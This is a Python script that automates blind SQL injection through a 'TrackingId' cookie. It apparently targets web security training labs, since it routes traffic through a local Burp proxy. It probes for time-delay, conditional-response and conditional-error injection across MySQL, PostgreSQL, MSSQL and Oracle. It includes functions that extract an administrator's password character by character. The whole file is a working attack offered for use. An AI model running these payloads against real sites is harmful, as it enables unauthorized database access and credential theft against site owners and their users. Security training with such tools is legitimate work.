# import re
import sys
import urllib.parse

import requests
import urllib3

# from bs4 import BeautifulSoup
from colorama import Fore
from requests.exceptions import RequestException

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

USER_NAME = "administrator"
TABLE_NAME = "users"
COLUMN_NAME = "username"

# find_password_length and solve_password are only working for Oracle DB for now


def solve_password(base_url, cookies, password_length):
    password_extracted = ""
    for i in range(1, password_length + 1):
        for j in range(32, 126):
            sqli_payload = f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM {TABLE_NAME} where {COLUMN_NAME}='{USER_NAME}' and ascii(substr(password,{i},1))='{j}') || '"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            tack_cook = cookies.get("TrackingId")
            sess_cook = cookies.get("session")
            if tack_cook is None or sess_cook is None:
                print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
                sys.exit(0)
            cookie = {
                "TrackingId": tack_cook + sqli_payload_encoded,
                "SessionId": sess_cook,
            }
            r = requests.get(
                base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5
            )

            if r.status_code == 200:
                print(
                    f"[-] Password: {Fore.YELLOW}{password_extracted}{Fore.RESET} - Testing: {Fore.YELLOW}{chr(j)}{Fore.RESET}"
                )
            else:
                password_extracted += chr(j)
                break
    print(
        f"{Fore.YELLOW}[-] Password: {password_extracted} and is {len(password_extracted)} long {Fore.RESET}"
    )
    return password_extracted


def find_password_length(base_url, cookies):
    password_length = 0
    for i in range(1, 50):
        sqli_payload = f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM {TABLE_NAME} where {COLUMN_NAME}='{USER_NAME}' and LENGTH(password)>{i}) || '"
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        tack_cook = cookies.get("TrackingId")
        sess_cook = cookies.get("session")
        if tack_cook is None or sess_cook is None:
            print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
            sys.exit(0)
        cookie = {
            "TrackingId": tack_cook + sqli_payload_encoded,
            "session": sess_cook,
        }
        r = requests.get(
            base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5
        )
        if r.status_code == 200:
            password_length = i
            break

    return password_length


def check_table_name(base_url, cookies, isOracle):
    sql_queries = [
        "' || (select '' FROM users LIMIT 1) || '",
        "' || (select '' FROM users where rownum =1) || '",
    ]
    sql_query = sql_queries[1] if isOracle else sql_queries[0]
    sql_query_encoded = urllib.parse.quote(sql_query)
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")
    if tack_cook is None or sess_cook is None:
        print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
        sys.exit(0)
    cookie = {
        "TrackingId": tack_cook + sql_query_encoded,
        "session": sess_cook,
    }
    r = requests.get(base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5)
    if r.status_code == 200:
        print(f"{Fore.GREEN}[-] {TABLE_NAME} table exists {Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] {TABLE_NAME} table does not exist {Fore.RESET}")
        sys.exit(0)


def check_user_name(base_url, cookies, isOracle):
    sql_queries = [
        "'1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)'",
        "'SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')'",
        f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM {TABLE_NAME} where {COLUMN_NAME}='{USER_NAME}') || '",
    ]
    sql_query = sql_queries[2] if isOracle else sql_queries[0]
    sql_query_encoded = urllib.parse.quote(sql_query)
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")
    if tack_cook is None or sess_cook is None:
        print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
        sys.exit(0)
    cookie = {
        "TrackingId": tack_cook + sql_query_encoded,
        "session": sess_cook,
    }
    r = requests.get(base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5)
    if r.status_code == 500:
        print(f"{Fore.GREEN}[-] {USER_NAME} exists {Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] {USER_NAME} does not exist {Fore.RESET}")
        sys.exit(0)


def check_constant(base_url, cookies, isOracle):
    check_table_name(base_url, cookies, isOracle)
    check_user_name(base_url, cookies, isOracle)


def check_non_oracle(base_url, cookies):
    sql_non_oracle = "' || (select '') || '"
    sql_non_oracle_encoded = urllib.parse.quote(sql_non_oracle)
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")
    if tack_cook is None or sess_cook is None:
        print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
        sys.exit(0)
    cookie = {
        "TrackingId": tack_cook + sql_non_oracle_encoded,
        "session": sess_cook,
    }
    r = requests.get(base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5)
    if r.status_code == 500:
        print(
            f"{Fore.RED}[-] Sqli CONDITIONAL ERROR is NOT possible For a non-oracle DB {Fore.RESET}"
        )
        return False

    sql_non_oracle = "' || (select '' FROM fdsaklfds) || '"
    sql_non_oracle_encoded = urllib.parse.quote(sql_non_oracle)
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")
    if tack_cook is None or sess_cook is None:
        print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
        sys.exit(0)
    cookie = {
        "TrackingId": tack_cook + sql_non_oracle_encoded,
        "session": sess_cook,
    }
    r = requests.get(base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5)
    if r.status_code == 500:
        print(
            f"{Fore.GREEN}[-] Sqli CONDITIONAL ERROR IS possible For a non-oracle DB {Fore.RESET}"
        )
        return True
    return False


def check_oracle(base_url, cookies):
    sql_oracle = "' || (select '' FROM dual) || '"
    sql_oracle_encoded = urllib.parse.quote(sql_oracle)
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")
    if tack_cook is None or sess_cook is None:
        print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
        sys.exit(0)
    cookie = {
        "TrackingId": tack_cook + sql_oracle_encoded,
        "session": sess_cook,
    }
    r = requests.get(base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5)
    if r.status_code == 500:
        print(
            f"{Fore.RED}[-] Sqli CONDITIONAL ERROR is NOT possible For an oracle DB {Fore.RESET}"
        )
        return False
    sql_oracle = "' || (select '' FROM dualdsafdsa) || '"
    sql_oracle_encoded = urllib.parse.quote(sql_oracle)
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")
    if tack_cook is None or sess_cook is None:
        print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
        sys.exit(0)
    cookie = {
        "TrackingId": tack_cook + sql_oracle_encoded,
        "session": sess_cook,
    }
    r = requests.get(base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5)
    if r.status_code == 500:
        print(
            f"{Fore.GREEN}[-] Sqli CONDITIONAL ERROR IS possible For an oracle DB {Fore.RESET}"
        )
        return True
    return False


def check_if_sqli_conditional_possible(base_url, cookies):
    if not check_non_oracle(base_url, cookies):
        check_oracle(base_url, cookies)


def check_if_sqli_response_possible(base_url, cookies):
    sqli_true = "' and 1=1--'"
    sqli_false = "' and 1=2--'"
    sqli_true_encoded = urllib.parse.quote(sqli_true)
    sqli_false_encoded = urllib.parse.quote(sqli_false)
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")
    if tack_cook is None or sess_cook is None:
        print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
        sys.exit(0)
    cookie = {
        "TrackingId": tack_cook + sqli_true_encoded,
        "session": sess_cook,
    }
    r = requests.get(base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5)
    r.raise_for_status()
    if "Welcome back" not in r.text:
        print(f"{Fore.RED}[-] Sqli conditional RESPONSES is NOT possible {Fore.RESET}")
        return False
    cookie = {
        "TrackingId": tack_cook + sqli_false_encoded,
        "session": sess_cook,
    }
    r = requests.get(base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5)
    r.raise_for_status()
    if "Welcome back" in r.text:
        print(f"{Fore.RED}[-] Sqli conditional RESPONSES is NOT possible {Fore.RESET}")
        return False
    print(f"{Fore.GREEN}[-] Sqli conditional RESPONSES is possible{Fore.RESET}")
    return True


def check_if_vuln_time_delay(base_url, cookies, time_delay):
    payloads = [
        "' || (SELECT SLEEP(10))--",
        "' || (SELECT pg_sleep(10))--",
        "' || (WAITFOR DELAY ''0:0:10'')--",
        "' || (dbms_pipe.receive_message(('a'),10))--",
    ]
    dbs = ["mySQL", "PostgreSQL", "MSFT", "Oracle"]
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")

    for index, payload in enumerate(payloads):
        encoded_py = urllib.parse.quote(payload)
        cookie = {
            "TrackingId": tack_cook + encoded_py,
            "session": sess_cook,
        }
        r = requests.get(
            base_url, cookies=cookie, proxies=proxies, verify=False, timeout=25
        )
        elapsed_time = r.elapsed.total_seconds()
        if elapsed_time >= int(time_delay):
            print(f"{Fore.GREEN}[+] DB is {dbs[index]} and is vulnerable to time delay{Fore.RESET}")
        else:
            print(f"{Fore.RED}[-] DB is NOT vulnerable to time delay{Fore.RESET}")


def get_cookies_from_url(base_url):
    try:
        r = requests.get(base_url, proxies=proxies, verify=False, timeout=5)
        if r.status_code == 200:
            cookies = {
                "TrackingId": r.cookies.get("TrackingId"),
                "session": r.cookies.get("session"),
            }
            return cookies

        print(f"HTTP GET request failed with status code: {r.status_code}")
        sys.exit(0)
    except RequestException as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(0)


def exploit(base_url):
    cookies = get_cookies_from_url(base_url)
    print(f"{Fore.GREEN}[+] Cookies: {cookies}{Fore.RESET}")
    answer = input("Do you want to check the time delay? [y/n]: ")
    if answer == "y":
        time_delay = input("Please, enter the time delay (in seconds): ")
        check_if_vuln_time_delay(base_url, cookies, time_delay)
    answer = input("Do you want to check for Conditional RESPONSE? [y/n]:")
    if answer == "y":
        check_if_sqli_response_possible(base_url, cookies)
    answer = input("Do you want to check for Conditional Error? [y/n]:")
    if answer == "y":
        check_if_sqli_conditional_possible(base_url, cookies)
    # answer = input("Is it an Oracle DataBase? [y/n]: ")
    # isOracle = False
    # if answer == "y":
    #     isOracle = True
    # check_constant(base_url, cookies, isOracle)
    # pwd_length = find_password_length(base_url, cookies)
    # print(f"{Fore.GREEN}[-] Password length =  {pwd_length}{Fore.RESET}")
    # if pwd_length > 0:
    #     final_password = solve_password(url, cookies, pwd_length)
    #     print(f"{Fore.RED}The password is: {final_password}{Fore.RESET}")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(
            f'[-] Example: {sys.argv[0]} USER_NAME = "administrator" TABLE_NAME = "users" COLUMN_NAME = "username""'
        )
        sys.exit(-1)

    print("[*] Exploiting...")
    exploit(url)
